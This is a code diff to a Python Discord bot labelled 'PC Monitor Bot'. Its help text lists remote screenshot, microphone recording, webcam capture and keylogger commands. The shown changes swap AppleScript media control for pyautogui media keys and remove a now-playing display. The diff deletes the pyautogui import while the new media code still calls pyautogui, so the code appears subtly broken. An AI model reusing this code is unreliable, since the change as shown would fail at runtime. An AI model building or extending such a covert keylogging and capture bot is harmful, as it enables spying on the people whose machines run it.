@@ -9,7 +9,6 @@ except ImportError:
         from python_dotenv import load_dotenv
     except ImportError:
         raise ImportError("Neither 'dotenv' nor 'python_dotenv' could be imported. Please ensure 'python-dotenv' is installed in your environment.")
-import pyautogui
 import sounddevice as sd
 import scipy.io.wavfile as wav
 import numpy as np
@@ -65,7 +64,8 @@ last_send_time = 0
 # def func
 def take_screenshot():
     """Take a screenshot and save it to a file. Returns the file path."""
-    screenshot = pyautogui.screenshot()
+    from PIL import ImageGrab
+    screenshot = ImageGrab.grab()
     screenshot_path = f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
     screenshot.save(screenshot_path)
     return screenshot_path
@@ -149,65 +149,27 @@ def take_webcam_photo(warmup_seconds: float = 0.3):
         cap.release()
 
 def control_media(action: str):
-    """Control media playback via Spotify or Music if running.
-
+    """Control media playback using pyautogui media keys.
+    
     Returns (success: bool, message: str)
     """
     action = action.lower()
-
-    action_to_applescript = {
-        'play': 'playpause',
-        'next': 'next track',
-        'prev': 'previous track',
-    }
-    if action not in action_to_applescript:
-        return False, f"Unsupported action: {action}"
-
-    applescript_command = action_to_applescript[action]
-
-    def is_app_running(candidate_names):
-        try:
-            candidate_lower = [c.lower() for c in candidate_names]
-            for proc in psutil.process_iter(['name']):
-                name = (proc.info.get('name') or '').lower()
-                if any(c in name for c in candidate_lower):
-                    return True
-        except Exception:
-            pass
-        return False
-
-    def run_osascript(app_name: str) -> bool:
-        try:
-            result = subprocess.run(
-                ['osascript', '-e', f'tell application "{app_name}" to {applescript_command}'],
-                capture_output=True,
-                text=True,
-                check=False,
-            )
-            return result.returncode == 0
-        except Exception:
-            return False
-
-    # Prefer controlling a running app to avoid launching unexpected apps
-    if is_app_running(['Spotify']):
-        if run_osascript('Spotify'):
-            return True, f"Media action '{action}' sent to Spotify"
-        # Fallback to focusing the app and simulating keys
-        if _activate_app('Spotify') and _pyautogui_control_app(action):
-            return True, f"Media action '{action}' simulated in Spotify"
-
-    if is_app_running(['Music', 'iTunes']):  # 'Music' on newer macOS, 'iTunes' on older
-        target = 'Music' if is_app_running(['Music']) else 'iTunes'
-        if run_osascript(target):
-            return True, f"Media action '{action}' sent to {target}"
-        if _activate_app(target) and _pyautogui_control_app(action):
-            return True, f"Media action '{action}' simulated in {target}"
-    # Try controlling YouTube in a browser as a fallback
-    yt_success, yt_msg = control_youtube_media(action)
-    if yt_success:
-        return True, yt_msg
-
-    return False, "No supported media player is running"
+    
+    try:
+        if action == 'play':
+            pyautogui.press('playpause')
+            return True, "Play/Pause command sent"
+        elif action == 'next':
+            pyautogui.press('nexttrack')
+            return True, "Next track command sent"
+        elif action == 'prev':
+            pyautogui.press('prevtrack')
+            return True, "Previous track command sent"
+        else:
+            return False, f"Unsupported action: {action}"
+    except Exception as e:
+        logger.error(f"Error with media control: {str(e)}")
+        return False, f"Failed to send media command: {str(e)}"
 
 def set_volume(level):
     """Set system volume (macOS) to a value between 0 and 100."""
@@ -630,20 +592,6 @@ def _activate_app(app_name: str) -> bool:
     except Exception:
         return False
 
-def _pyautogui_control_app(action: str) -> bool:
-    try:
-        if action == 'play':
-            pyautogui.press('space')
-            return True
-        if action == 'next':
-            pyautogui.hotkey('command', 'right')
-            return True
-        if action == 'prev':
-            pyautogui.hotkey('command', 'left')
-            return True
-    except Exception:
-        return False
-    return False
 
 def control_youtube_media(action: str):
     """Attempt to control YouTube playback in common browsers. Returns (success, message)."""
@@ -661,8 +609,6 @@ def control_youtube_media(action: str):
                     if _chromium_media_control(app, action):
                         return True, f"Media action '{action}' sent to YouTube ({app}) via fallback"
                 # Final fallback: activate app and simulate keystrokes
-                if _activate_app(app) and _pyautogui_control_app(action):
-                    return True, f"Media action '{action}' simulated in YouTube ({app})"
     if is_process_running(['Safari']):
         check = _run_js_in_safari("location.href.includes('youtube.com')||location.href.includes('music.youtube.com')")
         if check.strip().lower() == 'true':
@@ -672,8 +618,6 @@ def control_youtube_media(action: str):
             if check_any and ('youtube.com' in check_any or 'music.youtube.com' in check_any):
                 if _safari_media_control(action):
                     return True, f"Media action '{action}' sent to YouTube (Safari) via fallback"
-            if _activate_app('Safari') and _pyautogui_control_app(action):
-                return True, f"Media action '{action}' simulated in YouTube (Safari)"
     return False, "No supported media tab is active"
 
 def on_key_press(key):
@@ -797,7 +741,7 @@ async def help_command(interaction: discord.Interaction):
 **PC Monitor Bot Commands**
 /ss - Take a screenshot
 /mic - Record audio from the microphone
-/media - Control media playback and show now playing (play/next/prev/playing)
+/media - Control media playback (play/pause/next/prev)
 /volume - Set system volume (0-100%)
 /keylogger - Start or stop the keylogger
 /sysinfo - Show system information
@@ -840,138 +784,26 @@ async def record(interaction: discord.Interaction):
         else:
             await interaction.followup.send(f"Error recording audio: {str(e)}")
 
-@bot.tree.command(name='media', description='Control media playback and show now playing info')
+@bot.tree.command(name='media', description='Control media playback using system media keys')
 @discord.app_commands.describe(action='Media action to perform')
 @discord.app_commands.choices(action=[
     discord.app_commands.Choice(name='Play/Pause', value='play'),
     discord.app_commands.Choice(name='Next Track', value='next'),
-    discord.app_commands.Choice(name='Previous Track', value='prev'),
-    discord.app_commands.Choice(name='Now Playing', value='playing')
+    discord.app_commands.Choice(name='Previous Track', value='prev')
 ])
 async def media_control(interaction: discord.Interaction, action: discord.app_commands.Choice[str]):
-    """Enhanced media control with proper error handling and response management."""
-    artwork_path = None
+    """Simple and reliable media control using pyautogui media keys."""
     try:
-        # Defer the response early to prevent timeout
-        await interaction.response.defer()
+        success, message = control_media(action.value)
         
-        content_lines = []
-        file_to_send = None
-        embed = None
-
-        # Handle control actions
-        if action.value in ('play', 'next', 'prev'):
-            try:
-                success, msg = control_media(action.value)
-                status_emoji = '🎵' if success else '⚠️'
-                content_lines.append(f"{status_emoji} {msg}")
-                
-                # Add a small delay to let the media player update
-                await asyncio.sleep(0.5)
-            except Exception as e:
-                logger.error(f"Error in control_media: {str(e)}")
-                content_lines.append(f"⚠️ Error controlling media: {str(e)}")
-
-        # Fetch current playing info
-        try:
-            info = get_media_playing_info()
-        except Exception as e:
-            logger.error(f"Error getting media info: {str(e)}")
-            info = None
-
-        if info:
-            try:
-                # Extract info with safe defaults
-                app = info.get('app', 'Unknown')
-                title = info.get('title', 'Unknown')
-                artist = info.get('artist', 'Unknown') 
-                album = info.get('album', 'Unknown')
-                duration = float(info.get('duration', 0.0))
-                position = float(info.get('position', 0.0))
-                state = info.get('state', 'unknown')
-                
-                # Format progress display
-                progress = f"{format_time_mm_ss(position)} / {format_time_mm_ss(duration)}"
-
-                # Create embed with appropriate color
-                if 'Spotify' in app:
-                    color = 0x1DB954  # Spotify green
-                elif 'YouTube' in app:
-                    color = 0xFF0000  # YouTube red
-                elif 'Music' in app or 'iTunes' in app:
-                    color = 0xFA233B  # Apple Music red
-                else:
-                    color = 0x808080  # Default gray
-
-                embed = discord.Embed(
-                    title='🎵 Now Playing', 
-                    description=f"**{title}**", 
-                    color=color
-                )
-                embed.add_field(name='App', value=app, inline=True)
-                embed.add_field(name='Artist', value=artist, inline=True)
-                embed.add_field(name='Album', value=album, inline=True)
-                embed.add_field(name='State', value=state.capitalize(), inline=True)
-                embed.add_field(name='Progress', value=progress, inline=True)
-                embed.add_field(name='\u200b', value='\u200b', inline=True)  # Empty field for formatting
-
-                # Handle artwork
-                artwork_url = info.get('artwork_url')
-                info_artwork_path = info.get('artwork_path')
-                
-                if artwork_url:
-                    embed.set_thumbnail(url=artwork_url)
-                elif info_artwork_path and os.path.exists(info_artwork_path):
-                    try:
-                        file_to_send = discord.File(info_artwork_path, filename='artwork.jpg')
-                        embed.set_thumbnail(url='attachment://artwork.jpg')
-                        artwork_path = info_artwork_path  # Store for cleanup
-                    except Exception as e:
-                        logger.error(f"Error loading artwork file: {str(e)}")
-                        file_to_send = None
-
-            except Exception as e:
-                logger.error(f"Error creating embed: {str(e)}")
-                embed = None
-
-        # Build final content message
-        if content_lines:
-            content = "\n".join(content_lines)
-        elif info:
-            content = "🎵 Now Playing"
+        if success:
+            await interaction.response.send_message(f"🎵 {message}")
         else:
-            content = "⚠️ No supported media player is running"
-
-        # Send the response
-        try:
-            if file_to_send and embed:
-                await interaction.followup.send(content, embed=embed, file=file_to_send)
-            elif embed:
-                await interaction.followup.send(content, embed=embed)
-            else:
-                await interaction.followup.send(content)
-        except Exception as e:
-            logger.error(f"Error sending media response: {str(e)}")
-            await interaction.followup.send(f"⚠️ Error displaying media info: {str(e)}")
-
-    except Exception as e:
-        logger.error(f"Critical error in media_control: {str(e)}")
-        try:
-            if not interaction.response.is_done():
-                await interaction.response.send_message(f"⚠️ Error controlling media: {str(e)}")
-            else:
-                await interaction.followup.send(f"⚠️ Error controlling media: {str(e)}")
-        except Exception:
-            pass  # If we can't even send an error message, log it
+            await interaction.response.send_message(f"⚠️ {message}")
             
-    finally:
-        # Clean up temporary artwork files
-        if artwork_path and os.path.exists(artwork_path):
-            try:
-                os.remove(artwork_path)
-                logger.info(f"Cleaned up temporary artwork file: {artwork_path}")
-            except Exception as e:
-                logger.error(f"Error cleaning up artwork file {artwork_path}: {str(e)}")
+    except Exception as e:
+        logger.error(f"Error in media command: {str(e)}")
+        await interaction.response.send_message(f"⚠️ Error controlling media: {str(e)}")
 
 @bot.tree.command(name='volume', description='Set system volume')
 @discord.app_commands.describe(level='Volume level (0-100)')
